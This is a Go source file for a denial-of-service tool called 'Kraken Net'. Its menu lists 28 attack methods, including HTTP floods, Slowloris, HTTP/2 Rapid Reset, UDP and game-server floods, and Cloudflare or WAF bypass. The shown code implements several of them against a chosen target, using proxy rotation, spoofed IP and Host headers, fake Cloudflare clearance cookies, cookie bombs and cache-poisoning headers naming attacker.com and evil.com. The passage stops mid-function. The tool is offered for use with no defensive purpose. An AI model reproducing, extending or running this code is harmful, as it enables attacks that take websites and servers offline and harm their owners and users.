package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// ─────────────────────────────────────────────
//  TERMINAL COLORS
// ─────────────────────────────────────────────

const (
	Reset    = "\033[0m"
	Red      = "\033[0;31m"
	RedLight = "\033[91m"
	Green    = "\033[32m"
	Yellow   = "\033[33m"
	Cyan     = "\033[36m"
	Magenta  = "\033[35m"
	White    = "\033[37m"
	Gray     = "\033[90m"
	BRed     = "\033[1;31m"
	BGreen   = "\033[1;32m"
	BYellow  = "\033[1;33m"
	BCyan    = "\033[1;36m"
	BWhite   = "\033[1;37m"
	BMagenta = "\033[1;35m"
)

// ─────────────────────────────────────────────
//  GLOBAL STATE
// ─────────────────────────────────────────────

var (
	userAgents  []string
	referers    []string
	proxies     []string
	target      string
	connections int
	workers     int
	port        int
	durationSec int
	attackStart time.Time

	totalSuccess int64
	totalFail    int64
	totalBytes   int64
	totalReq     int64

	// per-method counters for live dashboard
	methodCounters = make(map[string]*int64)
	methodMu       sync.RWMutex
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// ─────────────────────────────────────────────
//  DEFAULT DATA
// ─────────────────────────────────────────────

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UP1A.231005.007)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
}

var defaultReferers = []string{
	"https://www.google.com/",
	"https://www.google.com/search?q=",
	"https://www.bing.com/",
	"https://duckduckgo.com/",
	"https://www.facebook.com/",
	"https://t.co/",
	"https://www.reddit.com/",
	"https://github.com/",
	"https://www.linkedin.com/",
	"https://www.youtube.com/",
	"https://news.ycombinator.com/",
	"https://twitter.com/",
}

var httpPaths = []string{
	"/", "/index.php", "/index.html", "/api", "/login", "/admin", "/wp-login.php",
	"/api/v1/users", "/search", "/.env", "/config.php", "/wp-admin/",
	"/api/v1/data", "/robots.txt", "/favicon.ico", "/static/",
	"/assets/", "/js/", "/css/", "/images/", "/uploads/",
	"/api/auth", "/api/token", "/graphql", "/rest/", "/v1/",
	"/api/v2/", "/health", "/status", "/metrics", "/debug/",
	"/.git/config", "/phpinfo.php", "/info.php", "/server-status",
	"/xmlrpc.php", "/wp-json/wp/v2/users", "/.well-known/security.txt",
	"/admin/config", "/administrator/", "/phpmyadmin/",
	"/api/v3/", "/swagger/", "/docs/", "/actuator/", "/actuator/health",
	"/actuator/env", "/_cat/indices", "/_nodes", "/console/",
}

var apiEndpoints = []string{
	"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit",
	"/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook",
	"/api/v3/stream", "/api/v2/upload", "/api/v1/report", "/api/v2/batch",
}

var graphqlQueries = []string{
	`{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}`,
	`{"query":"{ allProducts { id name price category { id name subcategories { id name products { id } } } reviews { id rating comment user { id name } } } }"}`,
	`{"query":"query deep { a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { p { id } } } } } } } } } } } } } } } } }"}`,
	`{"query":"{ search(query:\"test\") { ... on User { id } ... on Post { id } ... on Comment { id } ... on Product { id } } }"}`,
}

var bypassHeaders = []struct {
	Key   string
	Value string
	Rand  bool
}{
	{"X-Forwarded-For", "127.0.0.1", true},
	{"CF-Connecting-IP", "127.0.0.1", true},
	{"X-Real-IP", "127.0.0.1", true},
	{"True-Client-IP", "127.0.0.1", true},
	{"X-Forwarded-Host", "localhost", false},
	{"X-Host", "localhost", false},
	{"X-Forwarded-Server", "localhost", false},
	{"X-HTTP-Host-Override", "localhost", false},
	{"Forwarded", "for=127.0.0.1;by=127.0.0.1", false},
	{"X-Original-URL", "/", false},
	{"X-Rewrite-URL", "/", false},
	{"X-Forwarded-Proto", "https", false},
	{"X-Forwarded-Port", "443", false},
	{"X-Azure-ClientIP", "127.0.0.1", true},
	{"X-Client-IP", "127.0.0.1", true},
	{"X-ProxyUser-Ip", "127.0.0.1", true},
}

var acceptEncodings = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"br",
	"gzip",
	"identity",
	"*",
}

var discordPayloads = [][]byte{
	[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetstatus xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffgetchallenge xxx\x00\x00\x00"),
	[]byte("\xff\xff\xff\xffrcon \"\" \"\"\x00\x00\x00"),
}

// ─────────────────────────────────────────────
//  BANNER + UI
// ─────────────────────────────────────────────

func printBanner() {
	banner := `
              ...-%@@@@@@@-..               
             .:%@@@@@@@@@@@@%-.             
            .#@@@@@@@@@@@@@@@@#.            
           .%@@@@@@@@@@@@@@@@@@%.           
           :@@@@@@@@@@@@@@@@@@@@:           
 ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. 
:@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-
@#.  -@@@- :@@@@@@@@@@@@@@@@@@@@:.:@@@-  .#@
:-. .%@@@: .@@@@@@@@@@@@@@@@@@@@..:@@@%. .-:
   .*@@@=:@:.@@@@@@@@@@@@@@@@@@.:@:=@@@#.   
  .#@@@+ .#+.=@@@@@@@@@@@@@@@@=.+%..+@@@#.  
 .%@@@#..#@...##@@@@@@@@@@@@##. .%#..#@@@%. 
.*@@@@. *@*  -@@@@@@@@@@@@@@@@- .+@*..@@@@*.
-@@@@@. %@@:..*@.*@@@@@@@@*.%* .:@@@..@@@@@-
=@@@@@: %@@@@@#@@@@@@@@@@@@@@%@@@@@%.:@@@@@+
=@@@@@@=.+@%+%@@@@@@@@@@@@@@@@@=%@+.=@@@@@@=
.@@@@@@@@@@@@+@@@@@@@@@@@@@@@@+@@@@@@@@@@@@.
 .*@@@@==*@@#@@%#@@@@@@@@@@#%@@#@@#=-@@@@*..
 .:#@@@@@+@@-@=%@@@@@@@@@@@@%=@-@@+@@@@@#:..
:@@@@@@@@=@@:#@@@@@@@##@@@@@@@%.@@=@@@@@@@@:
#@@@@@-:.*-@@@@@@@@@- .-@@@@@@@@@-*.:-@@@@@#
#@@@@@@@%-@@@@@@@%... ....%@@@@@@@-%@@@@@@@#
:@@@@@@@-%@@@@@:  =@@::@@=  :@@@@@%:@@@@@@@:
 .-@@@@@:@@@@@-    .@%%@.    -@@@@@:@@@@@-..
         #@@@@#....*@..@#....#@@@@#.        
         .%@@@@@@@@@+ .+@@@@@@@@@%.         
          .:@@@@@@+.   ..+@@@@@@:.          
`
	fmt.Println(RedLight + banner + Reset)
	fmt.Println()
	fmt.Println("   " + BCyan + "K R A K E N   N E T" + Reset + "   " + BWhite + "v5.0 PHANTOM TIER" + Reset)
	fmt.Println("   " + Gray + "Layer 7 Full Spectrum | 28 Methods | by Piwiii2.0" + Reset)
	fmt.Println()
}

func mhead(title, color string) {
	d := 43 - len(title)
	if d < 0 {
		d = 0
	}
	fmt.Println(color + "┌─ " + title + " " + strings.Repeat("─", d) + "┐" + Reset)
}

func mrow(name, desc string) {
	p1 := 18 - len(name)
	p2 := 27 - len(desc)
	if p1 < 0 {
		p1 = 0
	}
	if p2 < 0 {
		p2 = 0
	}
	fmt.Println("│ " + BWhite + name + Reset + strings.Repeat(" ", p1) + desc + strings.Repeat(" ", p2) + "│")
}

func mfoot(color string) {
	fmt.Println(color + "└" + strings.Repeat("─", 46) + "┘" + Reset)
}

func printMenu() {
	fmt.Println()
	mhead("TLS / HTTP CORE", Cyan)
	mrow("kraken", "TLS multi-request flood")
	mrow("tls", "Standard TLS flood")
	mrow("http-flood", "HTTP GET/POST flood")
	mrow("https-flood", "HTTPS TLS flood")
	mrow("api-flood", "JSON API heavy payloads")
	mrow("header-flood", "Massive header flood")
	mrow("mixpost", "Mixed content-type POST")
	mrow("cf-bypass", "Browser-like CF bypass")
	mrow("range", "Range header abuse")
	mrow("cookie-bomb", "500 cookies per request")
	mfoot(Cyan)
	fmt.Println()
	mhead("ADVANCED LAYER 7", Yellow)
	mrow("slowloris", "Slow HTTP headers hold")
	mrow("rudy", "R.U.D.Y slow POST body")
	mrow("rapid-reset", "HTTP/2 Rapid Reset (CVE-2023-44487)")
	mrow("h2-cont", "HTTP/2 CONTINUATION flood")
	mrow("h2-priority", "HTTP/2 PRIORITY frame storm")
	mrow("chunk-post", "Chunked drip POST")
	mrow("ws-flood", "WebSocket message flood")
	mrow("malformed", "Malformed 8K URL GET")
	mrow("tls-fragment", "TLS ClientHello fragmentation")
	mrow("http-pipeline", "HTTP/1.1 pipeline flood")
	mfoot(Yellow)
	fmt.Println()
	mhead("EVASION + BYPASS", Magenta)
	mrow("cache-bust", "Cache-busting param rotation")
	mrow("cache-poison", "Cache poisoning headers")
	mrow("origin-spoof", "Origin/Host header spoofing")
	mrow("etag-storm", "ETag/If-None-Match exhaust")
	mrow("accept-flood", "Accept-* header mutation")
	mrow("gzip-bomb", "Gzip inflate exhaust")
	mrow("jwt-spray", "JWT brute token spray")
	mrow("graphql-depth", "GraphQL deep query flood")
	mrow("multipart-exhaust", "Multipart form exhaust")
	mrow("retry-after", "Retry-After abuse loop")
	mfoot(Magenta)
	fmt.Println()
	mhead("UDP", Red)
	mrow("udp-discord", "Quake3 query flood")
	mrow("udp-bypass", "Random payload flood")
	mrow("udp-gbps", "High bandwidth flood")
	mrow("fivem", "FiveM getinfo flood")
	mfoot(Red)
	fmt.Println()
	mhead("GAME", Green)
	mrow("minecraft", "Minecraft handshake flood")
	mfoot(Green)
	fmt.Println()
	mhead("ULTIMATE", RedLight)
	mrow("hybrid", "TLS+API+WS+H2+GraphQL+Cache")
	mrow("apocalypse", "All 28 vectors maximum")
	mfoot(RedLight)
	fmt.Println()
}

// ─────────────────────────────────────────────
//  HELPERS
// ─────────────────────────────────────────────

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	agents := userAgents
	if len(agents) == 0 {
		agents = defaultUserAgents
	}
	return agents[rand.Intn(len(agents))]
}

func randomReferer() string {
	refs := referers
	if len(refs) == 0 {
		refs = defaultReferers
	}
	return refs[rand.Intn(len(refs))]
}

func randomMethod() string {
	switch rand.Intn(10) {
	case 0, 1:
		return "POST"
	case 2:
		return "HEAD"
	case 3:
		return "PUT"
	default:
		return "GET"
	}
}

func randomPath() string {
	if rand.Intn(3) != 0 {
		return httpPaths[rand.Intn(len(httpPaths))]
	}
	b := make([]byte, rand.Intn(20)+5)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "/" + string(b)
}

func randomBypassHeader() (string, string) {
	h := bypassHeaders[rand.Intn(len(bypassHeaders))]
	if h.Rand && rand.Intn(2) == 0 {
		return h.Key, randomIP()
	}
	return h.Key, h.Value
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(254)+1)
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randEmail() string {
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
	return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
}

func formatBytes(b float64) string {
	units := []string{"B", "KB", "MB", "GB", "TB"}
	i := 0
	for b >= 1024 && i < len(units)-1 {
		b /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", b, units[i])
}

func formatDuration(d time.Duration) string {
	m := int(d.Minutes())
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%02dm:%02ds", m, s)
}

func parseTarget(targetURL string) (string, string, string, string) {
	u, err := url.Parse(targetURL)
	if err != nil || u.Host == "" {
		return "https", targetURL, "443", "/"
	}
	scheme := u.Scheme
	host := u.Hostname()
	p := u.Port()
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	if p == "" {
		if scheme == "https" {
			p = "443"
		} else {
			p = "80"
		}
	}
	return scheme, host, p, path
}

func dialTarget(host, p string) (net.Conn, error) {
	addr := net.JoinHostPort(host, p)
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		pURL, err := url.Parse(px)
		if err != nil {
			return nil, err
		}
		rawConn, err := net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return nil, err
		}
		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
		}
		connectReq += "\r\n"
		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return nil, err
		}
		br := bufio.NewReader(rawConn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			rawConn.Close()
			return nil, err
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return nil, fmt.Errorf("proxy connect failed: %d", resp.StatusCode)
		}
		return rawConn, nil
	}
	return net.DialTimeout("tcp", addr, 5*time.Second)
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func trackMethod(name string) {
	methodMu.Lock()
	if _, ok := methodCounters[name]; !ok {
		var c int64
		methodCounters[name] = &c
	}
	methodMu.Unlock()
	methodMu.RLock()
	atomic.AddInt64(methodCounters[name], 1)
	methodMu.RUnlock()
}

// ─────────────────────────────────────────────
//  HTTP CLIENTS
// ─────────────────────────────────────────────

func newHTTPClientTLSWithProxy(proxyStr string, conns int) *http.Client {
	var proxyURL *url.URL
	if proxyStr != "" {
		proxyURL, _ = url.Parse(proxyStr)
	}
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        conns * 4,
		MaxIdleConnsPerHost: conns * 4,
		MaxConnsPerHost:     conns * 4,
		IdleConnTimeout:     30 * time.Second,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"},
			MinVersion:         tls.VersionTLS12,
		},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func newNoTimeoutClient() *http.Client {
	base := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
	c := *base
	c.Timeout = 0
	if t, ok := base.Transport.(*http.Transport); ok {
		tc := t.Clone()
		tc.ResponseHeaderTimeout = 0
		tc.IdleConnTimeout = 0
		c.Transport = tc
	}
	return &c
}

// ─────────────────────────────────────────────
//  PAYLOAD GENERATORS
// ─────────────────────────────────────────────

func genAPIPayload() string {
	generators := []func() string{
		func() string {
			bioLen := 2000 + rand.Intn(8000)
			return fmt.Sprintf(
				`{"user_id":"%d","action":"update_profile","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
				rand.Intn(9999999), randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
			)
		},
		func() string {
			var sb strings.Builder
			n := 500 + rand.Intn(4500)
			sb.WriteString(`{"action":"bulk_insert","token":"`)
			sb.WriteString(randString(64))
			sb.WriteString(`","items":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
					rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
		func() string {
			depth := 20 + rand.Intn(30)
			var sb strings.Builder
			for i := 0; i < depth; i++ {
				fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
			}
			sb.WriteString(`{"end":true}`)
			for i := 0; i < depth; i++ {
				sb.WriteString(`}}`)
			}
			return sb.String()
		},
		func() string {
			return fmt.Sprintf(
				`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","data":"%s"}}}}`,
				rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
				randString(8), randString(5), randString(1000+rand.Intn(4000)),
			)
		},
	}
	return generators[rand.Intn(len(generators))]()
}

func genGzipBombPayload() []byte {
	// generates a gzip payload that expands to ~1MB on decompression
	inner := bytes.Repeat([]byte("A"), 1024*1024)
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(inner)
	gz.Close()
	return buf.Bytes()
}

func genFakeJWT() string {
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(
		`{"sub":"%d","iat":%d,"exp":%d,"role":"admin","jti":"%s"}`,
		rand.Intn(9999999), time.Now().Unix(), time.Now().Add(24*time.Hour).Unix(), randString(32),
	)))
	sig := randString(43)
	return header + "." + payload + "." + sig
}

// ─────────────────────────────────────────────
//  ── CORE METHODS ──
// ─────────────────────────────────────────────

func sendTLSRequest(client *http.Client, baseURL string) bool {
	method := randomMethod()
	path := randomPath()
	var body io.Reader
	if method == "POST" || method == "PUT" {
		body = strings.NewReader(genAPIPayload())
	}
	req, err := http.NewRequest(method, baseURL+path, body)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	hk, hv := randomBypassHeader()
	req.Header.Set(hk, hv)
	req.Header.Set("Cookie", "session="+randString(32)+"; _ga="+randString(12)+"; csrf="+randString(24))
	atomic.AddInt64(&totalReq, 1)
	trackMethod("kraken")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	atomic.AddInt64(&totalBytes, resp.ContentLength)
	return resp.StatusCode < 500
}

func apiFloodRequest(client *http.Client, targetURL string) bool {
	body := genAPIPayload()
	fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]
	req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", randString(32))
	req.Header.Set("Authorization", "Bearer "+randString(64))
	req.Header.Set("Origin", targetURL)
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	trackMethod("api-flood")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func headerFloodRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	n := 80 + rand.Intn(120)
	for i := 0; i < n; i++ {
		req.Header.Set("X-"+randString(8+rand.Intn(8)), randString(512+rand.Intn(1024)))
	}
	atomic.AddInt64(&totalReq, 1)
	trackMethod("header-flood")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func mixPostRequest(client *http.Client, targetURL string) bool {
	var body string
	var contentType string
	switch rand.Intn(5) {
	case 0:
		contentType = "application/json"
		body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(1024), rand.Intn(9999), randString(64))
	case 1:
		contentType = "application/xml"
		body = fmt.Sprintf(`<?xml version="1.0"?><root><data>%s</data><id>%d</id><token>%s</token></root>`, randString(1024), rand.Intn(9999), randString(64))
	case 2:
		contentType = "application/x-www-form-urlencoded"
		body = "data=" + randString(1024) + "&id=" + strconv.Itoa(rand.Intn(9999)) + "&token=" + randString(64)
	case 3:
		contentType = "text/plain"
		body = randString(2048)
	case 4:
		contentType = "application/octet-stream"
		body = string(generatePayload(2048))
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(body)))
	trackMethod("mixpost")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cfBypassRequest(client *http.Client, targetURL string) bool {
	sep := "?"
	if strings.Contains(targetURL, "?") {
		sep = "&"
	}
	fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999)) + "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Cookie", "cf_clearance="+randString(43)+"; __cf_bm="+randString(36)+"; _cfuvid="+randString(48))
	atomic.AddInt64(&totalReq, 1)
	trackMethod("cf-bypass")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func rangeRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	var ranges []string
	for i := 0; i < 200; i++ {
		ranges = append(ranges, fmt.Sprintf("%d-%d", i*512, i*512+511))
	}
	req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))
	atomic.AddInt64(&totalReq, 1)
	trackMethod("range")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func cookieBombRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	var cookies strings.Builder
	for i := 0; i < 500; i++ {
		cookies.WriteString(randString(8+rand.Intn(8)) + "=" + randString(64+rand.Intn(64)) + "; ")
	}
	req.Header.Set("Cookie", cookies.String())
	atomic.AddInt64(&totalReq, 1)
	trackMethod("cookie-bomb")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// ─────────────────────────────────────────────
//  ── NEW EVASION METHODS ──
// ─────────────────────────────────────────────

// cacheBustRequest rotates cache-busting params + pragma/cache-control combos
func cacheBustRequest(client *http.Client, targetURL string) bool {
	cacheBusters := []string{
		fmt.Sprintf("?cb=%d&_=%s", time.Now().UnixNano(), randString(12)),
		fmt.Sprintf("?v=%s&nocache=%d", randString(8), rand.Intn(999999)),
		fmt.Sprintf("?t=%d&r=%s", time.Now().UnixMilli(), randString(6)),
		fmt.Sprintf("?__cache_bust=%s", randString(16)),
		fmt.Sprintf("?bust=%d&x=%s", rand.Intn(9999999), randString(8)),
	}
	fullURL := targetURL + cacheBusters[rand.Intn(len(cacheBusters))]
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	trackMethod("cache-bust")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// cachePoisonRequest injects poisoning headers to corrupt CDN caches
func cachePoisonRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	// Classic cache-poisoning vectors
	poisonHeaders := [][]string{
		{"X-Forwarded-Host", randString(16) + ".attacker.com"},
		{"X-Forwarded-Scheme", "nothttps"},
		{"X-Original-URL", "/admin/" + randString(8)},
		{"X-Rewrite-URL", "/" + randString(12)},
		{"X-Override-URL", "https://" + randString(8) + ".com/"},
		{"Forwarded", "host=" + randString(8) + ".evil.com"},
		{"X-Custom-IP-Authorization", randomIP()},
		{"X-Host", randString(12) + ".com"},
	}
	for _, h := range poisonHeaders {
		req.Header.Set(h[0], h[1])
	}
	req.Header.Set("Cache-Control", "max-age=86400")
	atomic.AddInt64(&totalReq, 1)
	trackMethod("cache-poison")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// originSpoofRequest floods with origin/host mutation to confuse WAF routing
func originSpoofRequest(client *http.Client, targetURL string) bool {
	_, host, _, _ := parseTarget(targetURL)
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	spoofedHosts := []string{
		"localhost",
		"127.0.0.1",
		"0.0.0.0",
		"::1",
		host + ".evil.com",
		"internal." + host,
		"admin." + host,
		randomIP(),
	}
	req.Header.Set("Origin", "https://"+spoofedHosts[rand.Intn(len(spoofedHosts))])
	req.Header.Set("Host", spoofedHosts[rand.Intn(len(spoofedHosts))])
